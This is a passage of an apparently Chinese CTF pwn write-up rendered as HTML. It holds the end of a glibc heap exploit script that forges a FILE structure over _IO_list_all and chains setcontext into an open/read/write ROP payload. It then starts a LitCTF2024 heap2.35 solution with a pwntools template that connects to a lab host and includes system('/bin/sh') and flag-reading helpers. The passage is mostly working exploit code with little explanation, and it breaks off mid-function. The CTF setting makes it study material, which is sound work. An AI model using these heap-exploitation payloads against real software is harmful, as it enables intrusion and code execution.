    <span class="nf">sla</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">command: </span><span class="se">\n</span><span class="sh">'</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="s">2</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sla</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">Index: </span><span class="sh">'</span><span class="p">,</span><span class="nf">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span><span class="n">commend</span><span class="p">):</span>
    <span class="nf">sla</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">command:</span><span class="sh">'</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="s">3</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sla</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">Index: </span><span class="sh">'</span><span class="p">,</span><span class="nf">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
    <span class="nf">sa</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">Message: </span><span class="se">\n</span><span class="sh">'</span><span class="p">,</span><span class="n">commend</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">show</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
    <span class="nf">sla</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">command:</span><span class="sh">'</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="s">4</span><span class="sh">'</span><span class="p">)</span>   
    <span class="nf">sla</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">Index: </span><span class="sh">'</span><span class="p">,</span><span class="nf">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
   
<span class="k">def</span> <span class="nf">exit</span><span class="p">():</span>
    <span class="nf">sla</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">command:</span><span class="sh">'</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="s">6</span><span class="sh">'</span><span class="p">)</span>  

<span class="nf">set_key</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span>

<span class="nf">add</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span> <span class="c1">#0
</span><span class="nf">add</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span> <span class="c1">#1
</span><span class="nf">add</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="c1">#2
</span><span class="nf">dele</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
<span class="nf">dele</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="nf">dele</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>

<span class="nf">add</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="c1">#3
</span><span class="nf">add</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="c1">#4
</span><span class="nf">add</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="c1">#5
</span><span class="nf">add</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="c1">#6
</span>
<span class="nf">dele</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
<span class="nf">dele</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
<span class="nf">show</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>

<span class="nf">ru</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">Message: </span><span class="se">\n</span><span class="sh">'</span><span class="p">)</span>
<span class="n">libc_base</span> <span class="o">=</span> <span class="nf">uu64</span><span class="p">()</span> <span class="o">-</span> <span class="mh">0x1f2cc0</span>
<span class="nf">lg</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">libc_base</span><span class="sh">'</span><span class="p">,</span><span class="n">libc_base</span><span class="p">)</span>
<span class="n">io</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
<span class="n">heap_base</span> <span class="o">=</span> <span class="nf">uu64</span><span class="p">()</span> <span class="o">-</span> <span class="mh">0x17f0</span>
<span class="nf">lg</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">heap_base</span><span class="sh">'</span><span class="p">,</span><span class="n">heap_base</span><span class="p">)</span>


<span class="nf">dele</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
<span class="nf">dele</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span>
<span class="nf">add</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span> <span class="c1">#7
</span><span class="nf">add</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="c1">#8
</span><span class="nf">add</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="c1">#9
</span><span class="nf">pause</span><span class="p">()</span>
<span class="nf">dele</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span>
<span class="nf">add</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>


<span class="n">target_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">'</span><span class="s">_IO_list_all</span><span class="sh">'</span><span class="p">]</span> 
<span class="nf">lg</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">_IO_list_all</span><span class="sh">'</span><span class="p">,</span><span class="n">target_addr</span><span class="p">)</span>
<span class="n">_IO_wstrn_jumps</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">'</span><span class="s">_IO_wstrn_jumps</span><span class="sh">'</span><span class="p">]</span>
<span class="n">_IO_wfile_jumps</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">'</span><span class="s">_IO_wfile_jumps</span><span class="sh">'</span><span class="p">]</span>
<span class="n">_IO_stdfile_1_lock</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x1f5720</span>
<span class="n">f1</span> <span class="o">=</span> <span class="nc">FileStructure</span><span class="p">()</span>
<span class="n">f1</span><span class="p">.</span><span class="n">_IO_read_ptr</span> <span class="o">=</span> <span class="mh">0xa81</span>
<span class="n">f1</span><span class="p">.</span><span class="n">flags</span> <span class="o">=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0x2000</span><span class="p">)</span>
<span class="n">f1</span><span class="p">.</span><span class="n">_IO_save_base</span> <span class="o">=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">heap_base</span><span class="o">+</span><span class="mh">0x1a00</span><span class="p">)</span>
<span class="n">f1</span><span class="p">.</span><span class="n">_lock</span> <span class="o">=</span> <span class="n">_IO_stdfile_1_lock</span>
<span class="n">fake_IO_FILE</span> <span class="o">=</span> <span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0x1810</span>
<span class="n">f1</span><span class="p">.</span><span class="n">_wide_data</span> <span class="o">=</span> <span class="n">fake_IO_FILE</span> <span class="o">+</span> <span class="mh">0xe0</span>
<span class="n">f1</span><span class="p">.</span><span class="n">vtable</span> <span class="o">=</span> <span class="n">_IO_wfile_jumps</span>

<span class="n">setcontext</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">'</span><span class="s">setcontext</span><span class="sh">'</span><span class="p">]</span>
<span class="n">pop_rdi</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x2daa2</span>
<span class="n">ret</span> <span class="o">=</span> <span class="n">pop_rdi</span><span class="o">+</span><span class="mi">1</span>
<span class="n">pop_rax</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x446c0</span>
<span class="n">pop_rsi</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x37c0a</span>
<span class="n">pop_rdx_rbx</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x87729</span> 
<span class="n">syscall</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x883b6</span>

<span class="n">magic_gadget</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x146020</span>
<span class="n">magic</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x1482BA</span>

<span class="nf">lg</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">fake_IO_FILE</span><span class="sh">'</span><span class="p">,</span><span class="n">fake_IO_FILE</span><span class="p">)</span>
<span class="n">data</span> <span class="o">=</span> <span class="nf">flat</span><span class="p">({</span>
    <span class="mh">0x8</span><span class="p">:</span> <span class="n">target_addr</span> <span class="o">-</span> <span class="mh">0x20</span><span class="p">,</span>
    <span class="mh">0x10</span><span class="p">:{</span>
        <span class="mi">0</span><span class="p">:{</span>
           <span class="mi">0</span><span class="p">:</span><span class="nf">bytes</span><span class="p">(</span><span class="n">f1</span><span class="p">),</span>
           <span class="mh">0xe0</span><span class="p">:</span> <span class="p">{</span>
               <span class="mh">0x18</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
               <span class="mh">0x30</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
               <span class="mh">0xe0</span><span class="p">:</span> <span class="n">fake_IO_FILE</span> <span class="o">+</span> <span class="mh">0x200</span><span class="p">,</span>
               <span class="mh">0x110</span><span class="p">:</span><span class="mh">0x20</span><span class="p">,</span>
           <span class="p">},</span>
           <span class="mh">0x200</span><span class="p">:</span>   
                <span class="p">{</span>
                <span class="mh">0x0</span><span class="p">:</span> <span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0x1d00</span><span class="p">,</span>
                <span class="mh">0x8</span><span class="p">:</span> <span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0x1a00</span><span class="p">,</span>
                <span class="mh">0x10</span><span class="p">:</span> <span class="n">setcontext</span> <span class="o">+</span> <span class="mi">61</span><span class="p">,</span>
                <span class="mh">0x18</span><span class="p">:</span> <span class="n">magic_gadget</span><span class="p">,</span>
                <span class="mh">0x68</span><span class="p">:</span> <span class="n">magic</span><span class="p">,</span>
                <span class="mh">0x90</span><span class="p">:</span> <span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0x1d10</span><span class="p">,</span>  <span class="c1">#rop链的入口
</span>                <span class="mh">0x98</span><span class="p">:</span> <span class="n">ret</span>


                    <span class="p">},</span>
           <span class="mh">0x300</span><span class="p">:</span> <span class="p">{</span>
               <span class="mh">0x0</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
               <span class="mh">0x8</span><span class="p">:</span><span class="n">heap_base</span><span class="o">+</span><span class="mh">0x300</span><span class="p">,</span>
               <span class="mh">0x10</span><span class="p">:</span> <span class="sh">'</span><span class="s">flag</span><span class="se">\x00\x00\x00\x00</span><span class="sh">'</span><span class="p">,</span>
               <span class="mh">0x20</span><span class="p">:</span> <span class="n">setcontext</span><span class="o">+</span><span class="mi">61</span>
           <span class="p">},</span>         
           <span class="mh">0x500</span><span class="p">:</span> <span class="p">[</span>
               <span class="n">pop_rax</span><span class="p">,</span>
               <span class="mi">2</span><span class="p">,</span>
               <span class="n">pop_rdi</span><span class="p">,</span>
               <span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0x1b20</span><span class="p">,</span>
               <span class="n">pop_rsi</span><span class="p">,</span>
               <span class="mi">0</span><span class="p">,</span>
               <span class="n">syscall</span><span class="p">,</span>

               <span class="n">pop_rax</span><span class="p">,</span>
               <span class="mi">0</span><span class="p">,</span>
               <span class="n">pop_rdi</span><span class="p">,</span>
               <span class="mi">3</span><span class="p">,</span>
               <span class="n">pop_rsi</span><span class="p">,</span>
               <span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0x500</span><span class="p">,</span>
               <span class="n">pop_rdx_rbx</span><span class="p">,</span>
               <span class="mh">0x40</span><span class="p">,</span>
               <span class="mi">0</span><span class="p">,</span>
               <span class="n">syscall</span><span class="p">,</span>

               <span class="n">pop_rax</span><span class="p">,</span>
               <span class="mi">1</span><span class="p">,</span>
               <span class="n">pop_rdi</span><span class="p">,</span>
               <span class="mi">1</span><span class="p">,</span>
               <span class="n">pop_rsi</span><span class="p">,</span>
               <span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0x500</span><span class="p">,</span>
               <span class="n">pop_rdx_rbx</span><span class="p">,</span>
               <span class="mh">0x40</span><span class="p">,</span>
               <span class="mi">0</span><span class="p">,</span>
               <span class="n">syscall</span>
           <span class="p">]</span>
              
        <span class="p">},</span>
        <span class="mh">0xa80</span><span class="p">:[</span><span class="mi">0</span><span class="p">,</span><span class="mh">0xab1</span><span class="p">]</span>
    <span class="p">}</span>
<span class="p">})</span>
<span class="nf">debug</span><span class="p">(</span><span class="sh">"</span><span class="s">call (void)signal(SIGALRM, SIG_IGN)</span><span class="sh">"</span><span class="p">)</span> 
<span class="nf">edit</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span><span class="n">data</span><span class="p">)</span>
<span class="nf">dele</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
<span class="nf">add</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
<span class="nf">exit</span><span class="p">()</span>
<span class="nf">inter</span><span class="p">()</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<h3 id="litctf2024-heap235">LitCTF2024 heap2.35</h3>

<p>chunk无大小限制的uaf，所以tcache写<code class="language-plaintext highlighter-rouge">_IO_list_all</code>，打House of apple即可。</p>

<p>网上有很多方法</p>

<p>但是哥们学习了这两种直接拿shell的</p>

<h5 id="方法1-house-of-apple2tcachebin-attack">方法1: house of apple2+tcachebin attack</h5>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146
147
148
149
150
151
152
153
154
155
156
157
158
159
160
161
162
163
164
165
166
167
168
169
170
171
172
173
</pre></td><td class="rouge-code"><pre><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="n">ctypes</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">pwn</span> <span class="o">=</span> <span class="sh">'</span><span class="s">./heap</span><span class="sh">'</span>
<span class="n">libc</span> <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="sh">'</span><span class="s">./libc.so.6</span><span class="sh">'</span><span class="p">)</span>

<span class="k">if</span> <span class="n">args</span><span class="p">[</span><span class="sh">'</span><span class="s">REMOTE</span><span class="sh">'</span><span class="p">]:</span>
    <span class="n">io</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="sh">'</span><span class="s">192.168.18.22</span><span class="sh">'</span><span class="p">,</span> <span class="mi">8888</span><span class="p">)</span>
<span class="k">else</span><span class="p">:</span>
    <span class="n">io</span> <span class="o">=</span> <span class="nf">process</span><span class="p">(</span><span class="n">pwn</span><span class="p">)</span>

<span class="nf">context</span><span class="p">(</span><span class="n">log_level</span><span class="o">=</span><span class="sh">'</span><span class="s">debug</span><span class="sh">'</span><span class="p">)</span>
<span class="c1">#context.terminal = ['tmux','splitw','-h']
</span><span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">elf</span> <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="n">pwn</span><span class="p">)</span>
<span class="n">rop</span> <span class="o">=</span> <span class="nc">ROP</span><span class="p">(</span><span class="n">context</span><span class="p">.</span><span class="n">binary</span><span class="p">)</span>

<span class="n">s</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span><span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sa</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">text</span><span class="p">,</span> <span class="n">data</span><span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">sendafter</span><span class="p">(</span><span class="n">text</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
<span class="n">sl</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span><span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sla</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">text</span><span class="p">,</span> <span class="n">data</span><span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="n">text</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
<span class="n">r</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">num</span><span class="o">=</span><span class="mi">4096</span><span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
<span class="n">ru</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">text</span><span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="n">text</span><span class="p">)</span>
<span class="n">pr</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">num</span><span class="o">=</span><span class="mi">4096</span><span class="p">:</span> <span class="nf">print</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="n">num</span><span class="p">))</span>
<span class="n">inter</span> <span class="o">=</span> <span class="k">lambda</span><span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>

<span class="n">l32</span> <span class="o">=</span> <span class="k">lambda</span><span class="p">:</span> <span class="nf">u32</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="se">\xf7</span><span class="sh">'</span><span class="p">)[</span><span class="o">-</span><span class="mi">4</span><span class="p">:].</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>
<span class="n">l64</span> <span class="o">=</span> <span class="k">lambda</span><span class="p">:</span> <span class="nf">u64</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x7f</span><span class="sh">'</span><span class="p">)[</span><span class="o">-</span><span class="mi">6</span><span class="p">:].</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>
<span class="n">uu32</span> <span class="o">=</span> <span class="k">lambda</span><span class="p">:</span> <span class="nf">u32</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">).</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>
<span class="n">uu32_hex</span> <span class="o">=</span> <span class="k">lambda</span><span class="p">:</span> <span class="nf">int</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">0x</span><span class="sh">'</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span> <span class="o">+</span> <span class="nf">r</span><span class="p">(</span><span class="mi">8</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>
<span class="n">uu64</span> <span class="o">=</span> <span class="k">lambda</span><span class="p">:</span> <span class="nf">u64</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">).</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>
<span class="n">uu64_hex</span> <span class="o">=</span> <span class="k">lambda</span><span class="p">:</span> <span class="nf">int</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">0x</span><span class="sh">'</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span> <span class="o">+</span> <span class="nf">r</span><span class="p">(</span><span class="mi">12</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>
<span class="n">uuu64</span> <span class="o">=</span> <span class="k">lambda</span><span class="p">:</span> <span class="nf">u64</span><span class="p">(</span><span class="nf">ru</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x7f</span><span class="sh">'</span><span class="p">)[</span><span class="o">-</span><span class="mi">6</span><span class="p">:].</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>
<span class="n">uuuu64</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">target</span><span class="p">:</span> <span class="nf">u64</span><span class="p">((</span><span class="nf">ru</span><span class="p">(</span><span class="n">target</span><span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">:]</span> <span class="o">+</span> <span class="nf">r</span><span class="p">(</span><span class="mi">5</span><span class="p">)).</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>

<span class="n">int16</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span><span class="p">:</span> <span class="nf">int</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>

<span class="n">lg</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">s</span><span class="p">,</span> <span class="n">num</span><span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">success</span><span class="p">(</span><span class="sh">'</span><span class="s">%s -&gt; 0x%x</span><span class="sh">'</span> <span class="o">%</span> <span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">num</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">get_sb</span><span class="p">():</span>
    <span class="k">return</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">'</span><span class="s">system</span><span class="sh">'</span><span class="p">],</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="nf">next</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="nf">search</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">/bin/sh</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">get_orw</span><span class="p">():</span>
    <span class="k">return</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">'</span><span class="s">open</span><span class="sh">'</span><span class="p">],</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">'</span><span class="s">read</span><span class="sh">'</span><span class="p">],</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">'</span><span class="s">write</span><span class="sh">'</span><span class="p">]</span>

<span class="k">def</span> <span class="nf">debug</span><span class="p">(</span><span class="n">breakpoints</span><span class="o">=</span><span class="bp">None</span><span class="p">):</span>
    <span class="k">if</span> <span class="n">breakpoints</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span>
        <span class="n">breakpoints</span> <span class="o">=</span> <span class="p">[</span><span class="sh">"</span><span class="s">__call_tls_dtors</span><span class="sh">"</span><span class="p">]</span>
    <span class="k">elif</span> <span class="nf">isinstance</span><span class="p">(</span><span class="n">breakpoints</span><span class="p">,</span> <span class="nb">str</span><span class="p">):</span>
        <span class="n">breakpoints</span> <span class="o">=</span> <span class="p">[</span><span class="n">breakpoints</span><span class="p">]</span>
    <span class="n">script</span> <span class="o">=</span> <span class="sh">""</span>
    <span class="k">for</span> <span class="n">bp</span> <span class="ow">in</span> <span class="n">breakpoints</span><span class="p">:</span>
        <span class="n">script</span> <span class="o">+=</span> <span class="sa">f</span><span class="sh">"</span><span class="s">b </span><span class="si">{</span><span class="n">bp</span><span class="si">}</span><span class="se">\n</span><span class="sh">"</span>
    <span class="n">gdb</span><span class="p">.</span><span class="nf">attach</span><span class="p">(</span><span class="n">proc</span><span class="p">.</span><span class="nf">pidof</span><span class="p">(</span><span class="n">io</span><span class="p">)[</span><span class="mi">0</span><span class="p">],</span> <span class="n">script</span><span class="p">)</span>
    <span class="nf">pause</span><span class="p">()</span>

<span class="k">def</span> <span class="nf">fmt</span><span class="p">(</span><span class="n">value</span><span class="p">,</span> <span class="n">offset</span><span class="o">=</span><span class="mi">14</span><span class="p">,</span> <span class="n">size</span><span class="o">=</span><span class="sh">'</span><span class="s">hhn</span><span class="sh">'</span><span class="p">):</span>
    <span class="k">if</span> <span class="n">size</span> <span class="o">==</span> <span class="sh">'</span><span class="s">hhn</span><span class="sh">'</span><span class="p">:</span>
        <span class="n">num</span> <span class="o">=</span> <span class="n">value</span> <span class="o">&amp;</span> <span class="mh">0xff</span>
    <span class="k">elif</span> <span class="n">size</span> <span class="o">==</span> <span class="sh">'</span><span class="s">hn</span><span class="sh">'</span><span class="p">:</span>
        <span class="n">num</span> <span class="o">=</span> <span class="n">value</span> <span class="o">&amp;</span> <span class="mh">0xffff</span>
    <span class="k">elif</span> <span class="n">size</span> <span class="o">==</span> <span class="sh">'</span><span class="s">n</span><span class="sh">'</span><span class="p">:</span>
        <span class="n">num</span> <span class="o">=</span> <span class="n">value</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">"</span><span class="s">%</span><span class="si">{</span><span class="n">num</span><span class="si">}</span><span class="s">c%</span><span class="si">{</span><span class="n">offset</span><span class="si">}</span><span class="s">$</span><span class="si">{</span><span class="n">size</span><span class="si">}</span><span class="sh">"</span><span class="p">.</span><span class="nf">encode</span><span class="p">()</span>
    <span class="c1">#value 是格式化字符串偏移          
</span>    <span class="k">return</span> <span class="n">payload</span>

<span class="n">lss</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">s</span><span class="p">:</span> <span class="n">log</span><span class="p">.</span><span class="nf">success</span><span class="p">(</span><span class="sh">'</span><span class="se">\033</span><span class="s">[1;31;40m%s --&gt; 0x%x </span><span class="se">\033</span><span class="s">[0m</span><span class="sh">'</span> <span class="o">%</span> <span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="nf">eval</span><span class="p">(</span><span class="n">s</span><span class="p">)))</span>

<span class="k">def</span> <span class="nf">cat_flag</span><span class="p">():</span>
    <span class="n">flag_header</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">flag{</span><span class="sh">'</span>
    <span class="nf">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="sh">'</span><span class="s">cat flag</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">ru</span><span class="p">(</span><span class="n">flag_header</span><span class="p">)</span>
    <span class="n">flag</span> <span class="o">=</span> <span class="n">flag_header</span> <span class="o">+</span> <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">}</span><span class="sh">'</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="s">}</span><span class="sh">'</span>
    <span class="nf">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>

<span class="c1">#asm(shellcraft.sh()).ljust(0x108,b'a')
</span>
<span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span><span class="n">size</span><span class="p">):</span>
    <span class="nf">sla</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">&gt;&gt;</span><span class="sh">'</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="s">1</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sla</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">idx? </span><span class="sh">'</span><span class="p">,</span><span class="nf">str</span><span class="p">(</span><span class="n">idx</span><span class="p">).</span><span class="nf">encode</span><span class="p">())</span>
    <span class="nf">sla</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">size? </span><span class="sh">'</span><span class="p">,</span><span class="nf">str</span><span class="p">(</span><span class="n">size</span><span class="p">).</span><span class="nf">encode</span><span class="p">())</span>

